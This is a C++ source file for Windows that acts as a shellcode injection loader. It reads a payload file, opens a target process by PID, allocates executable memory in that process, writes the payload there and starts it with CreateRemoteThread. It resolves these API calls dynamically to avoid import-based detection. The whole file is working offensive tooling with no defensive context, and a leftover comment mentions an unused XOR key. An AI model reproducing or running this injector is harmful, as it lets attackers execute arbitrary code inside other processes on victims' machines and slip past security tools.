#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <WinError.h>
#include <Windows.h>

using namespace std;

vector<BYTE> ReadBinaryFile(const string& filename) {
    ifstream file(filename, ios::binary);
    if (!file) {
        const auto& err = errno;

        char error_message[256];

        strerror_s(error_message, sizeof(error_message), err);

        cerr << "Could not open file: " << filename << ". Error: " << error_message << endl;
        return {};  // Return an empty vector
    }

    // Read file's content
    vector<BYTE> data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();
    return data;
}

typedef HANDLE(WINAPI* pOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId);
pOpenProcess OpenProcessPtr;

typedef LPVOID(WINAPI* pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );
pVirtualAllocEx VirtualAllocExPtr;

typedef BOOL(WINAPI* pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );
pWriteProcessMemory WriteProcessMemoryPtr;

typedef HANDLE(WINAPI* pCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId);
pCreateRemoteThread CreateRemoteThreadPtr;

typedef DWORD(WINAPI* pWaitForSingleObject)(
    HANDLE hHandle,
    DWORD  dwMilliseconds);
pWaitForSingleObject WaitForSingleObjectPtr;


int main(int argc, char* argv[])
{
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " [payload file] [Process PID]\n";
        return 1;
    }

    // Get the XOR encription key from command line as well as the filename
    string filename = argv[1];
    DWORD process_id = atoi(argv[2]);

    // Check if the process is running


    // Read the file
    vector<BYTE> fileData = ReadBinaryFile(filename);

    if (fileData.empty()) {
        return 2;
    }

    // 1. Open the remote process
    OpenProcessPtr = (pOpenProcess)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "OpenProcess");

    HANDLE hRemoteProcess = OpenProcessPtr(PROCESS_ALL_ACCESS, FALSE, process_id);

    if (hRemoteProcess != NULL)
        {
        // 2. Allocate a memory buffer in the remote process to store the shellcode
        VirtualAllocExPtr = (pVirtualAllocEx)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAllocEx");

        LPVOID pRemoteBuffer = VirtualAllocExPtr(hRemoteProcess, &fileData[0], fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // 3. Write the shellcode into the memory buffer
        SIZE_T WritteBytes;

        WriteProcessMemoryPtr = (pWriteProcessMemory)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WriteProcessMemory");

        WriteProcessMemoryPtr(hRemoteProcess, pRemoteBuffer, &fileData[0], fileData.size(),  &WritteBytes);

        // 4. Execute the shellcode
        CreateRemoteThreadPtr = (pCreateRemoteThread)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateRemoteThread");

        HANDLE hThread = CreateRemoteThreadPtr(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);

        if (hThread != NULL) {
            WaitForSingleObjectPtr = (pWaitForSingleObject)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WaitForSingleObject");
            WaitForSingleObjectPtr(hThread, 500);
            CloseHandle(hThread);
            return 0;
        }
    }
    else
    {
        cout << "[-] Process with PID " << process_id << " doesn't exist or isn't running" << endl;
        return 1;
    }

	return 0;
}
